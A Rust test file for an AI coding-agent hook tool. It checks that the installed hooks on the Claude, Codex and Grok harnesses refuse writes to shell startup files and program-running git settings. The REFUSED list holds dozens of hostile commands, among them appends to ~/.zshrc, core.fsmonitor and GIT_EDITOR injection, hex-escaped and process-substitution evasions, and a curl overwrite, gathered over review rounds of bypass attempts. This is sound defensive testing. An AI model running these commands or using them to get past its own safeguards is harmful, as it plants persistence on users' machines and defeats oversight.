//! TSK-242 (issue 86): the installed hooks of the three harnesses refuse
//! every visible write to a shell startup file in the fixture home, through
//! the shell and through the native edit tools, and let reads and ordinary
//! work through. `TSK242_TEST_BINARY` swaps the hook binary after install,
//! so the same journey records the fail-before verdicts of an older build.
use super::*;

const RULE: &str = "security.shell_startup";

fn startup_project() -> (Project, PathBuf) {
    let project = Project::new();
    if let Ok(old) = std::env::var("TSK242_TEST_BINARY") {
        std::fs::copy(old, project.bin.join("codeflow")).unwrap();
    }
    let home = std::fs::canonicalize(&project.home).unwrap();
    for name in [".zshrc", ".bashrc"] {
        std::fs::write(home.join(name), "# fixture\n").unwrap();
    }
    std::os::unix::fs::symlink(home.join(".zshrc"), project.root.join("rc")).unwrap();
    (project, home)
}

fn refused_with(outputs: &[Output], rule: &str) -> bool {
    outputs.iter().any(|out| {
        out.status.code() == Some(2) && String::from_utf8_lossy(&out.stderr).contains(rule)
    })
}

/// Visible shell writes, on Claude, Codex and Grok.
const REFUSED: &[&str] = &[
    "git -c core.gitProxy='sh /tmp/r.sh' log -p -- .envrc | head",
    "git -c mystery.key=1 log -p -- .envrc | head",
    "git -c include.path=/tmp/x log -p -- .envrc | head",
    "EDITOR='sh /tmp/r.sh' git log -p -- .envrc | head",
    "git --exec-path /tmp/x log -p -- .envrc | head",
    "echo 'alias git=true' >> ~/.zshrc",
    "printf 'git() { :; }' > $HOME/.bashrc",
    "printf x > ${HOME}/.profile",
    "tee -a ~/.profile < /dev/null",
    "cat payload >> ~/.ZSHENV",
    "cp payload ~/.config/fish/conf.d/x.fish",
    "ln -sf payload ~/.bash_aliases",
    "sed -i.bak 's/a/b/' ~/.zshrc",
    "bash -c \"echo x >> ~/.bashrc\"",
    "python3 -c \"open('.zshrc', 'a').write('x')\"",
    "echo x >> rc",
    "echo x > .envrc",
    "echo x > src/.envrc",
    "echo x > ~/$NAME",
    "cd ~ && echo x >> .zshrc",
    "ZDOTDIR=/tmp/z zsh -i -c true",
    "direnv allow",
    "tar -xf payload.tar -C ~",
    // Review round one.
    "cd ~; echo x > \"$DEST\"",
    "p=~/.zshrc; echo x > \"$p\"; p=notes",
    "curl -s -o$HOME/.zshrc https://example.invalid/x",
    "ZDOTDIR=/tmp/z zsh +f -c true",
    // Review round two.
    "ln -s ~/.zshrc notes-link",
    "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
    "rg alias ~/.zshrc",
    "sed -n 'w /tmp/x' ~/.zshrc",
    // Review round three.
    "cp -t\"$HOME\" fixtures/.zshrc",
    "sed -n '1e echo x >> sub/.envrc' notes",
    // Review of e4536456b: a literal the line assigns is read in code bodies.
    "p=~/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=src/.envrc; perl -e \"open(F,'>>$p')\"",
    "d=src; f=.envrc; python3 -c \"open('$d/$f','a')\"",
    "cat ~/.zshrc; python3 -c \"open('$NAME','a').write('x')\"",
    // Grok round two: process substitution and the same shape elsewhere.
    "bash <(echo 'echo x >> src/.envrc')",
    "source <(echo 'echo x >> src/.envrc')",
    "python3 <(echo 'open(\"src/.envrc\",\"a\").write(\"x\")')",
    "exec bash <(echo 'echo x >> src/.envrc')",
    "echo 'echo x >> src/.envrc' > r.sh; bash r.sh",
    "eval \"$(echo 'echo x >> src/.envrc')\"",
    // Grok round three: script tools fed text the call produced.
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -f a.awk",
    "printf 'w src/.envrc\\n' > s.sed; sed -f s.sed README.md",
    "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make",
    "printf 'w src/.envrc\\n' | sed -f - README.md",
    "printf '%s\\n' 'w src/.envrc' 'q' | ed -s README.md",
    "printf '%s\\n' '--- a/src/.envrc' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | patch -p1",
    // Grok round four: attached script options, nested and wrapped commands.
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -fa.awk",
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; gawk -i a.awk /dev/null",
    "printf 'w src/.envrc\\n' > s.sed; sed -nfs.sed README.md",
    "echo 'echo x >> src/.envrc' > r.sh; find . -exec sh r.sh \\;",
    "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; flock /tmp/l awk -f a.awk",
    "echo 'echo x >> src/.envrc' > r.sh; env -S 'sh r.sh'",
    "printf 'w src/.envrc\\n' > s.vim; vim -S s.vim",
    // Grok round five and the design pass: only data readers run.
    "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk -f README.md -f -",
    "printf 'echo x >> src/.envrc\\n' | awk '{system($0)}'",
    "printf 'echo x >> src/.envrc\\n' | awk '{print | \"sh\"}'",
    "printf 'echo x >> src/.envrc\\n' | sed e",
    "printf 'w src/.envrc\\n' > s.vim; vim -s s.vim",
    "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -C /tmp -S 'awk -f a.awk'",
    "printf 'sub/.envrc\\n' | git checkout --pathspec-from-file=-",
    "printf 'sub/.envrc\\n' | git rm -q --pathspec-from-file=-",
    // Grok round six: ANSI-C quoting and command-valued settings.
    "grep alias ~/.zshrc | awk $'BEGIN{printf \"x\" \\x3e (ENVIRON[\"HOME\"] \"/\\x2ezshrc\")}'",
    "bash -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
    "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
    "GIT_EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
    // Grok round seven: assignments that use $HOME are substituted.
    "F=$HOME/.zshrc GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
    "F=$HOME/.zshrc git -c core.fsmonitor='echo pwned >> $F' status",
];

/// Reads and ordinary work stay allowed.
const ALLOWED: &[&str] = &[
    "git -c core.fsmonitorHookVersion=2 log -p -- .envrc | head",
    "git -c clean.requireForce=yes log -p -- .envrc | head",
    "EDITOR='vim -R' git log -p -- .envrc | head",
    "git --exec-path=/usr/bin diff -- .envrc",
    "GIT_EXTERNAL_DIFF='diff -u' git log -p -- .envrc | head",
    "C=never git --config-env color.ui=C log -p -- .envrc | head",
    "cat ~/.zshrc",
    "grep alias ~/.bashrc",
    "ls ~/.config",
    "diff ~/.zshrc ~/.bashrc",
    "cp ~/.bashrc backup.txt",
    "echo x > notes.txt",
    "echo x > build/$NAME",
    "sh -c 'echo hi'",
    "cargo build",
    "rg --no-config alias ~/.zshrc",
    "sed -n 1,20p ~/.zshrc",
    "python3 -c 'print(1)'",
    "p=notes.txt; python3 -c \"open('$p','a').write('x')\"",
    "cat <(echo hello)",
    "diff <(echo a) <(echo b)",
    "bash <(echo 'echo hi')",
    "grep alias ~/.zshrc | awk '{print $2}'",
    "sed -i 's/a/b/' README.md",
    "make test",
    "grep -c alias ~/.zshrc > b.txt; sed -E 's/a/b/' README.md",
    "find . -name '*.rs' -print",
    "cat ~/.zshrc | sort | uniq -c | head",
    "git -c color.ui=never status",
    "git -c color.ui=never diff -- .envrc",
    "EDITOR=vim git log -p -- .envrc | head",
    "EDITOR=vim git log",
    "grep alias ~/.zshrc | sed -E 's/a/b/'",
    "cd ~1; cat policy.json",
];

#[test]
fn installed_hooks_refuse_shell_startup_writes_on_every_harness() {
    let (project, _home) = startup_project();
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in REFUSED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, RULE) {
                wrong.push(format!("{harness}: allowed {command}"));
            }
            for out in outputs.iter().filter(|o| o.status.code() == Some(2)) {
                let text = String::from_utf8_lossy(&out.stderr);
                if text.contains(RULE) && !text.contains("ask the operator") {
                    wrong.push(format!("{harness}: {command}: no route in {text}"));
                }
            }
        }
        for command in ALLOWED {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
        // A user-scope git key that runs a program is refused; an ordinary
        // user-scope key is not.
        let outputs = project.replay(
            harness,
            "Bash",
            json!({"command": "git config --global alias.st '!sh -c x'"}),
        );
        if !refused_with(&outputs, "git.hook_integrity") {
            wrong.push(format!("{harness}: allowed a global git alias"));
        }
        let outputs = project.replay(
            harness,
            "Bash",
            json!({"command": "git config --global user.name Test"}),
        );
        if outputs.iter().any(|o| !o.status.success()) {
            wrong.push(format!("{harness}: refused git config user.name"));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
fn installed_hooks_judge_git_config_files_and_switches() {
    // Review round eleven: git reads its system file under any install
    // prefix, so a key not known to run nothing refuses in every file that
    // is not a repository's own configuration; the switches beside the tool
    // programs take a boolean and pass.
    let (project, _home) = startup_project();
    let refused = [
        "git config --file /opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config --file=/opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config -f /opt/homebrew/etc/gitconfig alias.x '!id'",
        "git config --file /usr/local/etc/gitconfig core.pager 'sh x'",
        "GIT_CONFIG=/opt/homebrew/etc/gitconfig git config alias.x '!id'",
        "git config --global difftool.vimdiff.path /tmp/p.sh",
        "git config --global mergetool.vimdiff.cmd 'sh /tmp/p.sh'",
        "git config --global gpg.ssh.defaultKeyCommand /tmp/p.sh",
        "echo '[alias]' >> /opt/homebrew/etc/gitconfig",
    ];
    let allowed = [
        "git config --global difftool.prompt false",
        "git config --global mergetool.keepBackup true",
        "git config --global uploadpack.allowFilter true",
        "git config --global rebase.rescheduleFailedExec false",
        "git config --global pager.log 2",
        "git config --file .git/config alias.co checkout",
        "git config --file /tmp/scratch.cfg user.name Test",
    ];
    let mut wrong = Vec::new();
    for harness in ["claude", "codex", "grok"] {
        for command in refused {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if !refused_with(&outputs, "git.hook_integrity") {
                wrong.push(format!("{harness}: allowed {command}"));
            }
        }
        for command in allowed {
            let outputs = project.replay(harness, "Bash", json!({"command": command}));
            if outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}: refused {command}: {outputs:?}"));
            }
        }
    }
    // A native edit of another install's system file.
    let outputs = project.replay(
        "codex",
        "Write",
        json!({"file_path": "/opt/homebrew/etc/gitconfig", "content": "[alias]"}),
    );
    if !refused_with(&outputs, "git.hook_integrity") {
        wrong.push("codex:Write: allowed /opt/homebrew/etc/gitconfig".to_string());
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

#[test]
fn installed_edit_hooks_refuse_shell_startup_files() {
    let (project, home) = startup_project();
    let zshrc = home.join(".zshrc");
    let target = serde_json::to_string(zshrc.to_str().unwrap()).unwrap();
    let target = target.trim_matches('"');
    let root = serde_json::to_string(project.root.to_str().unwrap()).unwrap();
    let root = root.trim_matches('"');
    let mut wrong = Vec::new();
    for (harness, tool, data) in [
        (
            "codex",
            "apply_patch",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/codex-apply-patch.json"),
        ),
        (
            "grok",
            "write",
            include_str!("../../../codeflow-core/tests/fixtures/edit-hooks/grok-write.json"),
        ),
        (
            "grok",
            "search_replace",
            include_str!(
                "../../../codeflow-core/tests/fixtures/edit-hooks/grok-search-replace.json"
            ),
        ),
    ] {
        for (path, refused) in [
            (target, true),
            ("rc", true),
            (".envrc", true),
            ("notes.md", false),
        ] {
            let full = if path.starts_with('/') {
                path.to_string()
            } else {
                format!("{root}/{path}")
            };
            let text = data
                .replace(".codeflow/policy.json", path)
                .replace("/fixture/project/hello.txt", &full)
                .replace("/fixture/project/notes.txt", &full)
                .replace("/fixture/project", root);
            let payload: Value = serde_json::from_str(&text).unwrap();
            let outputs = project.replay_payload(harness, tool, &payload);
            if refused != refused_with(&outputs, RULE) {
                wrong.push(format!(
                    "{harness}:{tool}: {path} refused={refused}: {outputs:?}"
                ));
            }
            if !refused && outputs.iter().any(|o| !o.status.success()) {
                wrong.push(format!("{harness}:{tool}: refused {path}"));
            }
        }
    }
    for (tool, input) in [
        ("Write", json!({"file_path": zshrc, "content": "x"})),
        (
            "Edit",
            json!({"file_path": zshrc, "old_string": "a", "new_string": "b"}),
        ),
    ] {
        let outputs = project.replay("codex", tool, input);
        if !refused_with(&outputs, RULE) {
            wrong.push(format!("codex:{tool}: allowed {}", zshrc.display()));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Claude's edit tools are contained by its permission and sandbox denies,
/// which `codeflow init` installs from the shipped preset.
#[test]
fn installed_claude_settings_deny_shell_startup_edits() {
    let project = Project::new();
    let settings: Value =
        serde_json::from_slice(&std::fs::read(project.root.join(".claude/settings.json")).unwrap())
            .unwrap();
    let has = |list: &Value, rule: &str| {
        list.as_array()
            .is_some_and(|a| a.iter().any(|r| r.as_str() == Some(rule)))
    };
    let deny = &settings["permissions"]["deny"];
    let write = &settings["sandbox"]["filesystem"]["denyWrite"];
    for rule in [
        "Edit(~/.zshrc)",
        "Edit(~/.config/fish/**)",
        "Edit(//**/.envrc)",
    ] {
        assert!(has(deny, rule), "{rule}");
    }
    for path in ["~/.zshrc", "~/.bashrc", "~/.config/fish"] {
        assert!(has(write, path), "{path}");
    }
}
